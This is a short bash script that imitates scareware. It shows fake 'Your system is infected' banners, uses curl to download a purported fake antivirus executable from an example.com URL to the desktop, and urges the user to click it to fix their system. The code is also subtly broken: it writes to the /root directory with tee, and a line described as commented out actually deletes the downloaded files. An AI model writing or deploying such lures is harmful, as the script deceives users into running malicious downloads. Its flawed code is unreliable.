#!/bin/bash

echo "Warning" | figlet -c | tee /root
echo "Your system is infected" | figlet -c | tee /root
echo "Download this file now to fix it:" | figlet -c | tee /root

curl https://www.example.com/fake_antivirus_download.exe > /tmp/infected_file
mv /tmp/infected_file ~/Desktop/infected_file.exe

echo "Download complete." | figlet -c | tee /root
echo "Click the file on your desktop to fix your system." | figlet -c | tee /root

# Uncomment this line if you want to remove the downloaded infected file after a short delay.
sudo rm /tmp/infected_file ~/Desktop/infected_file.exe
